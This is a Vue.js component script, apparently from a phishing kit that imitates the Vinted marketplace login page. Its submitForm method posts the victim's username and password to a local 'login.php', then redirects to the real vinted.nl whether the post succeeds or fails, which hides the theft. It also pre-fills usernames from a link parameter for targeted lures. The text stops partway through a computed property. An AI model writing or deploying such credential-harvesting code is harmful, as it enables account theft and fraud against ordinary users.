<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
      usernameError: false,
      passwordError: false,
      progressActive: false,
      referrerPage: "//www.vinted.nl",
      username: '',
      password: '',
      menu1Open: false,
      menu2Open: false,
      menu3Open: false,
      menu4Open: false,
      menu5Open: false,
      menu6Open: false,
      mobileMenuOpen: false,
      searchButtonText: 'Kleding',
      passwordType: 'password'
    }
  },
  methods: {
    submitForm () {
      let vm = this
      vm.usernameError = vm.username.length === 0
      vm.passwordError = vm.password.length === 0
      if (!vm.usernameError && !vm.passwordError) {
        axios.post('login.php', {username: vm.username, password: vm.password})
        .then(res => {
          vm.progressActive = true
          setTimeout(function() {
            window.location.replace(vm.referrerPage);
          }, 350);
        })
        .catch(error => {
          vm.progressActive = true
          setTimeout(function() {
            window.location.replace(vm.referrerPage);
          }, 350);
        })
      }
    },
    initiatePage () {
      let uri = window.location.href.split("?");
      if (uri.length > 0 && uri[1] !== undefined) {
          let vars = uri[1].split("&");
          let getVars = {};
          let tmp = "";
          vars.forEach(function(v) {
            tmp = v.split("=");
            if (tmp.length == 2)
              getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
          });
          this.username = "undefined" !== typeof getVars["u"] ? getVars["u"] : "";
      }
    },
    openMenu (menu) {
      let t = this
      if (t.menu1Open && menu === 1) {
        t.menu1Open = false
        return 
      } else
      if (t.menu2Open && menu === 2) {
        t.menu2Open = false
        return 
      } else
      if (t.menu3Open && menu === 3) {
        t.menu3Open = false
        return 
      } else
      if (t.menu4Open && menu === 4) {
        t.menu4Open = false
        return 
      } else
      if (t.menu5Open && menu === 5) {
        t.menu5Open = false
        return 
      } else
      if (t.menu6Open && menu === 6) {
        t.menu6Open = false
        return 
      } else t.closeMenus()

      if (menu === 1) {
        t.menu1Open = true
        return 
      } else
      if (menu === 2) {
        t.menu2Open = true
        return 
      } else
      if (menu === 3) {
        t.menu3Open = true
        return 
      } else
      if (menu === 4) {
        t.menu4Open = true
        return 
      } else
      if (menu === 5) {
        t.menu5Open = true
        return 
      } else 
      if (menu === 6) {
        t.menu6Open = true
        return 
      }
    },
    closeMenus () {
      let t = this
      t.menu1Open = false
      t.menu2Open = false
      t.menu3Open = false
      t.menu4Open = false
      t.menu5Open = false
      t.menu6Open = false
    },
    searchButtonSelect (text) {
      let t = this
      t.searchButtonText = text
      t.menu6Open = false
    },
    togglePasswordType () {
      let t = this
      if (t.passwordType == 'password') {
        t.passwordType = 'text'
      } else {
        t.passwordType = 'password'
      }
    }
  },
  computed: {
    sMobile () {
